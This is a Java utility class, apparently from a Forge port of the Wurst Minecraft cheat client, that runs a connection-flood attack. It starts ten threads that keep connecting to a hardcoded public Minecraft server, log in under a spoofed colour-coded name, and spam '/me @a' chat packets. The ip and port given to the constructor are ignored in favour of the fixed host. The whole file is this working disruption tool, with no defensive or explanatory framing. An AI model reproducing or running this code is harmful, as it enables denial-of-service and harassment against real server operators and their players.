package net.wurstclient.forge.utils;

import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutput;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.Random;

import net.minecraft.client.Minecraft;
import net.wurstclient.forge.hacks.KickHack;

public class KickUtils {
	 public static String ip;
	    public static int port;

	    public KickUtils(String ip,int port){
	        this.ip=ip;
	        this.port=port;
	        for(int test=0;test<10;test++){
	            PAttack a= new PAttack();
	            a.start();
	        }
	    }
	}
	class PAttack extends Thread{
	    public void run(){
	        while(true){
	            if(KickHack.AttackStart!=1){
	                return;
	            }
	            if(Minecraft.getMinecraft().world==null){
	                return;
	            }
	            try{
	                //  sleep(125);
	                Socket socket=new Socket("china-pc.i5mc.com",25565);
	                DataInputStream socketInputStream = new DataInputStream(socket.getInputStream());
	                DataOutputStream socketOutputStream = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream(), 32767));
	                DataOutput sender = socketOutputStream;
	                Random e=new Random();
	                String name="ice_caught";
				/* String name=e.nextInt(10000)+""; */
				/* name=name+e.nextInt(10000)+e.nextInt(10000)+""; */
	                sender.write(new byte[]{6,0,4,0,99});
	                sender.writeByte(221);
	                sender.writeByte(2);
	                sender.writeByte(name.length()+2+2);
	                sender.writeByte(0);
	                sender.writeByte(name.length()+2);
	                sender.writeByte(194);
	                sender.writeByte(167);
	                //sender.writeByte(0);
	                sender.write(name.getBytes());
	                socketOutputStream.flush();
	                sleep(125);
	                for(int test=0;test<10;test++){
	                    sender.write(new byte[]{2,3,1,2,3,1,2,3,1,101,1,99,47,109,101,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,32,64,97,2,3,1});
	                    socketOutputStream.flush();
	                    sleep(10);
	                }
	                sleep(125);
	                socket.close();
	            }catch (Exception e){}
	        }
	    }
	}


